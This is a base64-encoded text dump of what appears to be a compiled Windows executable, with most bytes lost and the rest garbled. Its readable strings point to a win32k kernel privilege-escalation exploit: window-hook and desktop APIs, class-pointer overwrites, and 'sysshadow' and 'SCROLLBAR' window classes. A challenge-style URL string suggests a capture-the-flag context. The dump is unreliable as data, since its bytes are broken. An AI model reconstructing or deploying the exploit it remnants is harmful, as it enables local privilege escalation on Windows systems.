ICAgQiAgIAogICBCICAgICAgICAgICAgICBAICBAICAgICAgICAkICAgIE4gICAKICAgTiAgICAgICAgICAgICAgQCAgQiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNUQVRJQyAgICAgICAgICBHbG9iYWxcICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICkgCiAgICAgICB0JyAKICAgICAgICAgICAqIAogICAoICAgICAgICsgCiAgICAgRCwgCiAgICAgKyAKICAgbnRkbGwuZGxsICAgICAgIEgKICAgSCNIICAgICAgICAgICAgIFwgJSBTICAgXCAlIFMgICBzeXNzaGFkb3cgICAgICAgbXNjdGZpbWUgdWkgXCAgIFNDUk9MTEJBUiAgICAgICBcIEIgYSBzIGUgTiBhIG0gZSBkIE8gYiBqIGUgYyB0IHMgXCAlIFMgICAgICAgICBCICAgNCBQICA4ICBCICAgNCBQICA4ICBCICAgNCBQICBAICBCICAgNCBQICA4ICBCICAgNCBQICBAICBSICAgRCAgIDggIFIgICBEICAgQCAgCksgWCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXSEhJSApEJChIdGNISHRbSEh0U0FIdEtJSEg7dz9MTExMSHUKSEhIdUlJSUl0ClJXVlNIcjxIMwoiICAgO3QgQXUKSDNbXlozM3QKQVNBUkFRQVBSUVFSTDkKWVpBWEFZQVpBW1JXVlNBVEhyPEgzCiAgIEhOJExOCmlISTt0IEF1CkgzQVteX1pISFgKV0ggUSAgICAzCiU4ICAgSHAKZiA9TVogdQogICBMJChJWwpISEhISEhICkhbSCAgICAgICBbV0hIM0gzSAogICAgICAgSHVfU1dICnMgSCAgIEgKICAgXyU1ICAlNSAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMyAgJTMgICUzICAlMiAgJTMgICUyICAlMiAgJQo0ICAlNCAgJSA0ICAlCjQgICUgNCAgJSI0ICAlJDQgICUmNCAgJSg0ICAlKjQgICUsNCAgJS40ICAlNCAgJTQgICU0ICAlNCAgJUg0ICAlSjQgICVMNCAgJU40ICAlUDQgICVSNCAgJVQ0ICAlVjQgICUKMyAgJTIgIEgoSAoxICBIKEgkCj5ISHQkOEhIJDBIIF9IJAp7MyAgSEh0TQpISCQwSCBfSCQKV0ggPS0gIGQgICAKMCAgSEh0TkQzSCogIEUzREhBSQowICAzSCQwSGwkOEh0JEBIIF9IJAogIEhISEwkIDMgICAKICAgSEQkIEhIZjkKLyAgdH1IJDAKMSAgSEwkIExICjEgIEUzSFQkIEgkMAovICB0IkhEJCBICklzIElfSEhYClQgTSBISEAKICBIJChMRCQgZkQkIkhUJDAzCjEgIEgkWE8KICAgSUpBeiAgIApISEVBICAgWiAgIEpuIAo4IEggX0BTSDAzSEhMJCBIRCQgSEQkKEEgICBIZCRAIEhUJEBITCQgCmMvICBIVCRASApMLyAgSDBbQFNIIEUzQSAgIEhBUApIIFtIdE1IJAp1SCQwSGwkOEh0JEBIIF9ISFgKICBITCQgRDMsJyAgJCAKPSkgIEhMJCAKMC8gIHkgMwogICBEJCw9ICggIAogICA9WikgIAogICA9OTggIHR5PTogIHRZPT8gIHQ5PUIgIHQKMykgICAgICBZCiAgID0oICAgICAKKCAgICAgfCQsOTggIHQKICAgNSggICAgIApNNEA4fTp1CjVQKCAgICAgCjUoICAgICAganQKKCAgQTt1KEA4fTp1CnU7dEhAOH06dQp1OT0nICB0NQonICBGSFwkClVWV0FUQVVBVkFXSGwkSFAKICBlSDwlMCAgIEgzSAogICA7JyAgSApoKyAgPSYgICB8CkwgICAzSEwkREJIfCMgIEgKICBIRCRoSEwkSAomICBIRCR4SCAgIEhFCkxIIHomICBIICAgM0xIdCRYQSAgIEhMJFBFM0h0JEgzSHQkQER8JDhEdCQwRGwkKERkJCAKPSogIEggICBICicmICBIc0hICiAgSFAgRCBjJSAgSCtBCiAgTCAgIFdICikgIEhMJEhEJGgKciUgIEggICBIfCRYQSAgIEhEJFBFM0h8JEgzSHwkQER8JDhEdCQwRGwkKERkJCAKICA9NSQgIAogIEggICBISAojICAgICAgR3JlYXQtSm9iLlRoaXMtaXMtdGhlLWNvcnJlY3QtdXJsLmNoYWxsYW5nZS5jb20KPSMgICBKIAp1KCAgTExISAp4JyAgQVQkQkVEJGhITQogIGZEZUZIKQp1SCllICBICjknICBIdiBMdSwKJyAgInQzRDkKJyAgRTNITUUzMwogIEFfQV5BXUFfXl1IJAolICAzSEwkMERCUAogIEhkJCggSEQkMEUzRCQwUCAgIDNEJDQgICAgSEhEJGBEMyIKICBIdEhAUEg7diFICiUgIEgkICAgSAogICBfSEhYCkMgICBILUgKICAgdSA0ICAgCiAgTCllICBIKwogIEg9ICAgRTMKICAgRTMzQVEKSSQgIEhcJDBIbCQ4SHQkQEh8JEhIIEFeSFwkCkhsJCBWV0FUQVVBVkhwSGMKICBMLTxIIHUKICBBICAgIEgKICBMSEggTAogTEQkQD8gICAKRCRASGZEJGgKJTAgICBIWHhICkggICAgSHRMSEAKJCAgIEA5RTNIJCAgIAogICBIZCQwIEgkICAgZCQoIExIJCAgIE1EJCAgCiIgIHh4SGMKKSQgICBISAogIEggICAgIAogIDNMSElMCiAgTCRwSVtASWtISUFeQV1BX15ISFgKSHggQVZISEkgTwogIFBIRCRQRTNITCRISHwkQEwkOEwkMEwkKEwkIAogIDNMXCRJWwpJcyBJeyhJQV5IJQpVVldBVEFVQVZBV0hQM0hISHUgMwogIExMJChIJCAgIGIKICBMJCAgIAogICBIJCAgIE1ISAogICBMJCAgIApIJCAgIEwkICAgTCQgICBBCiAgIE1ISCAgIHRwSCQgICBIVCQwQQogICBETUggICA9QAogIERNSCAgIEhMJChNMwogIEhIJCAgIEhQQV9BXkFdQV9eXQpMICAgIH0gTCAKV0ggICAzQUlISE0KICAgM0hMJDBICiAgIEQkMFAgICBEJDQKICAgdSBIJFAKSCRYSGQkKCBIRCQwSAogIEUzSEQkIEFRCkQkNCAgICBIfCREJDQKICAgfCRASGQkKCBIRCQwSAogIEUzM0hEJCBFQQpMJCAgIElbCklzIElfSFwkCldBVEFVQVZBV0ggTEUzIAogIEVNQkwgTD0KICBBaCAgIAogIGZEb2QgdQogICAgICBICnVIKWUgICAKICB1MCAgIGY5RSB1JUQ5WAogIEhcJFBIbCRYSHQkSCBBX0FeQV1BX0xJWwpITiAgIGZwdUNICiAgSFwkOEh0JEBIIF9IXCQKICB1eEhPKEhUJCBBCkhkJDggSEwkOEUzQVAKICBIKEgoSCV3CiAgIEh0LUh0CkhkJDggSEwkOEUzQVAKICBIXCQwSCBfSCg9CkhkJDggSEwkOEUzQVAKICBIKEgoSCUKVVZXQVRBVUFWQVdIICAgSAogIEFkICAgQTMKQTNMIEFdQQpMM0RDQ0hMJEwKICBIJCAgIEhMJGhIKQogIEhMJHhIJCAgIEwkICAgSEwkCiAgSGQkWCBIJCAgIEh0JFBBCiAgIEhkJEggRTNIbCRARGwkOERkJDBBSQpEfCQoRHQkIAp1SCF8JFhETwp1SCF8JEhPCkhsJEBFM0RsJDhEZCQwRHwkKER0JCAKICBIJCAgIEgKICBQICAgSGQkWCBICiAgIEhkJEggRTNIbCRARGwkOERkJDBBSQpEfCQoRHQkIAogICBBX0FeQV1BXF9eXUhIWApIeCBBVkggSGM1VAogIExIdEYsCiAgIH0gSCUgICBIXCQwSHwkSEhsJDhIdCRASCBBXkhcJApXQVRBVUFWQVdIIEwKICAzRTNELAogIEFQc3dJCnQvSUlASD0Kd0hcJFBIbCRYSHQkSCBBX0FeQV1BX0gkCnQ9TEhMJCBITQpEJCA2ICAgCiAgdiBMO3UKRFlIJEBIdCRISWNIMF8KICAgdC8gICAzM1EKICAgTDtJSEhICiAgSEh0LEwKICBIJDBIbCQ4SHQkQEggX0hIMzlQCkQkMCAgIFAKICBFM0QkKEQkIAogIEh4SEh0P0grCiAgSCQwSCBfSCV4CiAgSDhBQEhUJChIVCQgRCQgREQkJEhIOAogIEggICAgIAogIHU5SEwkQAogIEhMJEBITCAKICBIRCRASHAKICBIVCRISAogIEhkJEggSAogIEgkMEggX0BTSCBISAogIHsnM0hICkggW0hFM0gKSHQkIFdBVkFXSDBMMzMKICAgQSkgIAogIExEJFBJIEgKICBMSEQkKEwKICBIIWwkKEhMJFBFM0QkICAgIEUzMwogIExIdH5ISDAKSCRYSGwkSEpYSHQkaEgwQV9BXl9ISFgKSHggVUFWQVdIaEgKICAzSEQkQEhEJEhEJFBISApILkhMJEBMCkhIQDg5dUUzQ0QKICBITCREM1kKICBITCRISEA4OXUKSEwkSEhAODl1TEQkQDNBCiAgIEh8JDBBICAgfCQoRTMKJCBBSEwkREMKICAgSEh1REhVcEhMJEAKICAgSHwkMERDfCQoSE1wRTMKICBIfCQgSERITAogIElbKElzMEl7OElBX0FeXUhcJApWV0FWSCBICkQzbCRATHBYQ2Z1CiAgIEk0TEwkQEhEQgogICBERCRACnJIXCRISGwkUEggQV5fXkhcJApWV0FWSCBICjNsJEBMcFhDZnUKICB0LEhDTEwkQEgKICAgREQkQEgKSFwkSEhsJFBIIEFeX15IXCQKSHwkIFVISDAzCiAgRCQgICAgIEEgIApFM0lISHRBTE0KICAgdClITE0KICAgSHwkWEhcJFBIMF1IKAogInR3ICJkdiAiNHUgIgpCICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAKICAgPCAgYAogIFA8ICA0CiAgcDwgIDQKICAiICA8ICAiICAjICA8ICAjICAlICAKPSAgUCYgIGwnICAsPSAgdCcgICkgIEA9ICApICAgID0gICAgCiAgbD0gICAgCiAgPSAgICA+LCAgPSAgRCwgICwgID0gICwgIGwuICA9ICB0LiAgPi8gID0gIEQvICAkMCAgPSAgLDAgIDAgID0gIAoxICAxICA9ICAxICAxICAKPiAgMSAgcDIgIAo+ICB4MiAgMiAgJD4gIDIgIDMgICw+ICAzICAKNCAgOD4gIDQgIDYgIEA+ICA2ICAKOSAgWD4gIAo5ICA5ICB0PiAgOSAgOiAgPiAgOiAgRjsgID4gIEw7ICA7ICA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEkgICAgICAgSiAgICAgIApKICAgICAgRyAgICAgIApIICAgICAgCkggICAgICAsSCAgICAgIDxIICAgICAgSkggICAgICBYSCAgICAgIGhIICAgICAgdEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICAKSSAgICAgICBJICAgICAgLEkgICAgICA6SSAgICAgIExJICAgICAgSSAgICAgIHRJICAgICAgSSAgICAgIEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICBJICAgICAgSSAgICAgICBKICAgICAgICAgICAgICAsTSAgICAgIApNICAgICAgICAgICAgICA4SiAgICAgIEpKICAgICAgakogICAgICB8SiAgICAgIEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgCksgICAgICAKSyAgICAgICxLICAgICAgQEsgICAgICBQSyAgICAgIGRLICAgICAgdEsgICAgICBLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgXEogICAgICAgICAgICAgIEcgICAgICBHICAgICAgSE0gICAgICAgICAgICAgIHZMICAgICAgTCAgICAgIEwgICAgICBMICAgICAgTCAgICAgIEwgICAgICBMICAgICAgIE0gICAgICA+TCAgICAgICJMICAgICAgIEwgICAgICBWTCAgICAgICAgICAgICAgQEcgICAgICAgICAgRyAgIEQgICBFICAgICAgICAgICpKICAgQiAgRiAgICAgICAgICBLICBAQyAgRyAgICAgICAgICAKTSAgQEQgIEhGICAgICAgICAgIDxNICAoQyAgICAgICAgICAgICAgICAgICAgICBJICAgICAgIEogICAgICAKSiAgICAgIEcgICAgICAKSCAgICAgIApIICAgICAgLEggICAgICA8SCAgICAgIEpIICAgICAgWEggICAgICBoSCAgICAgIHRIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgSCAgICAgIEggICAgICBIICAgICAgCkkgICAgICAgSSAgICAgICxJICAgICAgOkkgICAgICBMSSAgICAgIEkgICAgICB0SSAgICAgIEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICBJICAgICAgSSAgICAgIEkgICAgICAgSiAgICAgICAgICAgICAgLE0gICAgICAKTSAgICAgICAgICAgICAgOEogICAgICBKSiAgICAgIGpKICAgICAgfEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIEogICAgICBKICAgICAgSiAgICAgIApLICAgICAgCksgICAgICAsSyAgICAgIEBLICAgICAgUEsgICAgICBkSyAgICAgIHRLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIEsgICAgICBLICAgICAgSyAgICAgIFxKICAgICAgICAgICAgICBHICAgICAgRyAgICAgIEhNICAgICAgICAgICAgICB2TCAgICAgIEwgICAgICBMICAgICAgTCAgICAgIEwgICAgICBMICAgICAgTCAgICAgICBNICAgICAgPkwgICAgICAiTCAgICAgIApMICAgICAgVkwgICAgICAgICAgICAgIApfc253cHJpbnRmICAKX3N0cmljbXAgIG1zdmNydC5kbGwgIApHZXRDdXJyZW50UHJvY2VzcyB3CkdldFN5c3RlbURpcmVjdG9yeVcgCkdldE1vZHVsZUhhbmRsZUEgID4KTG9hZExpYnJhcnlBICAKR2xvYmFsQWxsb2MgCkdsb2JhbEZyZWUgIHoKR2V0U3lzdGVtSW5mbyB1IENvcHlGaWxlVyAKSXNXb3c2NFByb2Nlc3MgIApUbHNTZXRWYWx1ZSAKSGVhcEZyZWUgIApXYWl0Rm9yU2luZ2xlT2JqZWN0IApHZXRDdXJyZW50VGhyZWFkSWQgIApIZWFwQWxsb2MgClNsZWVwRXggClRsc0dldFZhbHVlICBDcmVhdGVFdmVudEEgIApTZXRUaHJlYWRBZmZpbml0eU1hc2sgClJlYWRGaWxlICAKSGVhcENyZWF0ZSAgClZpcnR1YWxQcm90ZWN0ICAKU2V0UHJpb3JpdHlDbGFzcyAgClNldFRocmVhZFByaW9yaXR5ICBDcmVhdGVGaWxlVyAKUmVzdW1lVGhyZWFkICAgQ3JlYXRlRmlsZUEgdgpHZXRTeXN0ZW1EaXJlY3RvcnlBIApUZXJtaW5hdGVUaHJlYWQgClRsc0FsbG9jICAgRGVsZXRlRmlsZVcgUiBDbG9zZUhhbmRsZSAgQ3JlYXRlVGhyZWFkICAKR2V0RmlsZVNpemUgUQpHZXRQcm9jZXNzSGVhcCAgClRsc0ZyZWUgS0VSTkVMMzIuZGxsICAKVW5ob29rV2luRXZlbnQgIApTZXRXaW5FdmVudEhvb2sgaiBDcmVhdGVNZW51ICA+ClBvc3RRdWl0TWVzc2FnZSAKIEFwcGVuZE1lbnVBIApTZXRDbGFzc0xvbmdBIApTZXRQYXJlbnQgClNlbmRNZXNzYWdlQSAgClRyYW5zbGF0ZU1lc3NhZ2UgIG0gQ3JlYXRlV2luZG93RXhBICBEZXN0cm95TWVudSAgRGVmV2luZG93UHJvY0EgIFMKUmVnaXN0ZXJDbGFzc0EgIApHZXRDbGFzc0xvbmdBIApTaG93V2luZG93ICAKU2V0VGhyZWFkRGVza3RvcCAgCkdldENsYXNzTmFtZUEgClNldENsYXNzTG9uZ1B0clcgIDwKUG9zdE1lc3NhZ2VBICAKU2V0V2luZG93TG9uZ1B0clcgClNldEFjdGl2ZVdpbmRvdyAKU2V0V2luZG93UG9zICAgRGVzdHJveVdpbmRvdyAgRGlzcGF0Y2hNZXNzYWdlQSAgXApHZXRNZXNzYWdlQSBbIENyZWF0ZURlc2t0b3BBICBKIENsb3NlRGVza3RvcCAgVVNFUjMyLmRsbCAgClJ0bEltYWdlUnZhVG9TZWN0aW9uICAKTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uICAKUnRsSW5pdFVuaWNvZGVTdHJpbmcgIDEKUnRsUXVlcnlFbnZpcm9ubWVudFZhcmlhYmxlX1UgClJ0bEltYWdlTnRIZWFkZXIgIApSdGxHZXRWZXJzaW9uIGIKUnRsQWxsb2NhdGVBY3RpdmF0aW9uQ29udGV4dFN0YWNrICBOdENhbGxiYWNrUmV0dXJuICBlClJ0bEFsbG9jYXRlSGVhcCAgCk50U2V0VGltZXIgIEoKUnRsRnJlZUhlYXAgIE50Q3JlYXRlVGltZXIgbnRkbGwuZGxsIApScGNTdHJpbmdGcmVlQSAgClV1aWRUb1N0cmluZ0EgUlBDUlQ0LmRsbCAgCm1lbXNldCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQgICB4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKbUAgQCAgICAgbmtAIExAICggICBFa0AgREAgICAKIGpAIDxAICAgCiBqQCBoQCBnIGQgaSAzIDIgLiBkIGwgbCAgIGEgZCB2IGEgcCBpIDMgMiAuIGQgbCBsICAgICBtIHMgdiBjIHIgdCAuIGQgbCBsICAgICByIHAgYyByIHQgNCAuIGQgbCBsICAgICBrIGUgciBuIGUgbCAzIDIgLiBkIGwgbCAgICAgayBlIHIgbiBlIGwgYiBhIHMgZSAuIGQgbCBsICAgICB1IHMgZSByIDMgMiAuIGQgbCBsICAgICBTVEFUSUMgICAgICAgICAgICAgIEdsb2JhbFwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFVTVlcKICAgX15baDMgIEFVTGVICiAgICBISHRMVQpMSSAgICBISHQKSUFdIHN5c3NoYWRvdyAgIG1zY3RmaW1lIHVpIFNDUk9MTEJBUiAgIFwgQiBhIHMgZSBOIGEgbSBlIGQgTyBiIGogZSBjIHQgcyBcICUgUyAgICAgKiBkIFAgICA4IGwgICAqIGQgUCAgIDggbCAgICogZCBQICAgOCBsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDIgbCBUICggQCBsICAgMiBsIFggKCBAIHggKCAgICAgICAKMSAgIHggSCAKMSAgIHggSCAKMiAgIHggSCAKMSAgIHggSCAKMSAgIHggSCAKMiAgIHggSCAKMiAgIHggUCAkCjIgICB4IFAgJApBIE4gICAgICAgICAgICAgICAgICAgICAgICAgICA3CjQgICB0ICAKQyBQICAgICAgICAgICAgICAgICAgICAgICAgICAgOgo2ICAgdCAgXApHIFQgICAgICAgICAgICAgICAgICAgICAgICAgICA9CjggICB0ICBsCjggICB0ICBsCjogICB0ICBsCksgWCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCj8gICB0ICB0CjwgICB0ICB0CksgWCAgICAgICA5CiAgICAgIEwgIEwgIEdDVEwgCiAgWSAgLmRhdGEgICBbICBcCiAgLnJkYXRhICBMYCAgICAgLnJkYXRhJHp6emRiZyAgIAphICAlICAudGV4dCRtbiAgICAKICAgICAuYnNzICAgICAgICwKICAuaWRhdGEkNSAgICAsICBkICAgLmlkYXRhJDIgICAgICAKICAgLmlkYXRhJDMgICAgICAsCiAgLmlkYXRhJDQgICAgCiAgLmlkYXRhJDYgICAgVXBFClJQaHpDLCgKIFJQaGZVPAowQCBIUEVYW0AgRQpURUVFRWYgZkVFZk1mCkVAQEVmfSB1RXRbQCBFCm5FRUVFZiBmRUVmTWYKRUBARWZ9IHVFCiAgIEVFRUVmIGZFRWZNZgpFQEBFZn0gdUVaQCBFCiAgIEVFRUVmIGZFRWZNZgpFQEBFZn0gdUUoW0AgRQpFRWYgZkVFZk1mCkVAQEVFQEBFZn0gdUVAW0AgRQpFRWYgZkVFZk1mCkVAQEVFQEBFZn0gdUUKRUVmIGZFRWZNZgpFQEBFRUBARWZ9IHUKIFU0VldlIGUgZSBFMAogIGUgakBoIDAgIEVQaiBFUGoKICBFIFQgIGpAaCAwICBFUGogRVBqCiAgICAgIEUgCmggMCAgRVBqIEVQagogICAgICAgICAKQCB9aCBUICBoCkAgdTMiICAKRWggICBFUEVQagogQCBFX15dCkAgakBoIDAgIFBqIGgKQCBqTUUgICAKQCBqQGggMCAgUGogaApAIGpFICAgCkAgRWoxWVtAIDNTU1BoY0AgZlNTCkAgaGEgIFYKQCBfXkVbXQp1VUZFRVBRXl0KICBTWCx0MApoICAgUlJSM0BSUCAgIDwKQCBVUVMgICBWV2oKLEAgdCFXakFWdwpAIFVRUTNWQD0wQCAgV3xPTHQkClNWVyAgIDNFMwogIFBzdTNATQpNYH5fVVEwQCBTVlczIH0gMVprCkAgVldqZCAgIF9XaiBFdX0KICBXaiBFcgogIEV9M0UgCkAgTUVRUUVQCkAgM1BTUFZ1dXVXagpNdTNQU1BWdXV1V2oKQCBNalBfICAgaQogIDNQU1B1dXV1dWoKdV9VPVhAICB0CiBdJTxAIFVWNVBAIAo0QCA9WEAgIHQpdAokQCA7ICAgdAogXl0laEAgVT1YQCAgdAogXSVEQCBVCiAgVlc1UEAgCiRAIDsgICB1dEcKICAgdU1oQCBQCkAgICAgVjVQQCAKJEAgOyAgIHV4TAogICB2byAgICB1ZkAKdSB7cHU+ICAgCkAgaiBoICAgaApTVlc1UEAgMwokQCA7ICAgCiAgIGpEakJXCjNmR0JqIFsKXUAgICAgIAogIDxjaiBqIAogICAgIEVXRwogIHUsICAgZjkKICAgZEAgIHUKXUAgajBFaiBQCkUwICAgK0UKdCFFU0VFUFNqClMgICBFICAgIF9eW10KM1BCNVlVPFNWV3UgM1cKICBlIGUgRQpNfSBqREVYakBaCnUgICB1aiB1CkAgRV9eW11VXSVAIFVWNVBAIApeXSVAIGogCiAgUFBoXEAgUAogVWRAIERTVlcgdQogIFFoICAgIAorZX5AICsrCn5AIFBYRCQKRCQkaiBMJApcQCBZZltAIHNEV1BqP1YKQCBXM1dXVwogICBrIDBAIAogICA9MEAgIHwKIFBEJChAOQpAIHh9V1dXU3QkCkQkLFB0JCwKMEAgaCAgIGEKQCBfXltdVVNWVzVQQCAKICAgICAgPAogICsgICAgCiAgfFRkQCAgdAogIGogaiBqCiBVICAgU1Z1CiAgVjVQQCAKQCBRUUQkKFAKICBqIDN8JEhZCkAgPUAgRCRURCQgRCRoRCREUEQkTCFxQCBmCiAgaCAgIGpuXCQKICBoKCMgIGhACiAgaCgjICBoQApAIFFRdCQsU1B0JCxEJEBoICAgUVBRCiAgNWxAIFAkCiAgICAgICtRICAgRCQkUVAgICAgICAKICBAIEQkSEQkRFBmCiAgM0QkIFc1CkAgV1d0JCx0JCh0JCR0JCxoICAgV1BXCiRAIFBXaHNAIDUKPTBAICBqMFkKICAgUVFragogIGogWTN8JChEJChEJCgKICAgUFNEJDQKQCBqRCQgICBqQlBGCiAgZiQgICAkICAgUGo3CiAgICAgaiBqNwpAICN0LDkgICB1JEQkbFAKQCBTU1NEJHhQCnBdQCBwQCAKel1AIGxAIAp0XUAgOEAgCnZdQCBAQCAKeF1AIFRAIHwKNEAgeFtAIAogIFVRUXhAIGUgVldQLDNVWkAgZnUKTXBdQCA8WkAgIApAQCB0JVpAICBFUHVqCjNfXl1VUVF4QCBWM1dQLHVVWkAgZnUKTXBdQCBFUGoKQEAgdCVaQCAgIEVQdWoKSHJfXl1VUVFlIEUKWEAgUEAgPVBAIHUKICBRUUVQewpEQCAhXVdoIiAgagogICAzVlZWCjxAICAgIEUgICAgICBQagpXaCB1QCBWVgogQCAzUGggICBQUFBFUApcQCA1UEAgCmRAICBaQCA5IHQKXltdVVFWMwogQCB7JzMiCiAgJEAgMzkKKEAgdTBWdQpAICAsQCAxCiB8JCRqIFgzCiJkOCAgIHAKZiA9TVogdQogIFNWV2hAIAo9fEAgZjk1QCB1CmRAICAgICAgIDsKICAgPSAoICAKICAgPVopICAKICAgPTk4ICB0eT06ICB0WT0/ICB0OT1CICB0CmRAICAgICAKICAgPWRAIAogIDk4ICB0CiAgIDVkQCBmCjBAICAgICAKICAgICAgO3UiOF11CjBAICAgIGoKWTt0QjhddQp8QCB0MTt1YQo9MEAgX1ZWCmhAIF5VU1d0Cmp6amFqWmpBCmUgU1ZXVU1TUVJWV30gdHV1Zj5NWnVrCnY8PlBFICB1YFZ4dFkKM19eWllbRUVfVVFRV1VNV31FTQogVmggICBqIGoKICBmIyBAICBmCnRAIF9eXVVRUzNWM0NdOXUKdEhkMCAgIHhAIHQ0VkVQVmglCiBVU3sgICBdCkAgQSJyPSAKICVAICVAICUKQCAlIEAgJSRAICUoQCAlLEAgJTBAICU0QCAlOEAgJSBAICU8QCAlQEAgJURAICVIQCAlTEAgJVBAICVUQCAlWEAgJUAgJUAgJWRAICVoQCAlCkAgJXxAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICVAICUKQCAlQCAlQCAlIEAgJQpAICUkQCAlCkAgJXRAICVwQCAlQCAlQCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgMiAgQiAgUCAgXCAgciAgeiAgICAgICAgCiAgIiAgMiAgRiAgUiAgICByICB8ICAgICAgZiAgVCAgICAgICAgCiAgICAgICAgIAogICAgOiAgTiAgICByICAgICAgICAgIAogICggIDggIEwgIFogIGwgIHwgIAogICAgICAgIAogICogIDogICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgICAgICAgICBKICAKICAgICAgICAgIHYgIHAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAyICBCICBQICBcICByICB6ICAgICAgICAKICAiICAyICBGICBSICAgIHIgIHwgICAgICBmICBUICAgICAgICAKICAgICAgICAgCiAgICA6ICBOICAgIHIgICAgICAgICAgCiAgKCAgOCAgTCAgWiAgbCAgfCAgCiAgICAgICAgCiAgKiAgOiAgICAKICAgICAgICAgICAgOQpfc253cHJpbnRmICBeCl9zdHJpY21wICBtc3ZjcnQuZGxsICB+CldhaXRGb3JTaW5nbGVPYmplY3QgUwpHZXRFeGl0Q29kZVRocmVhZ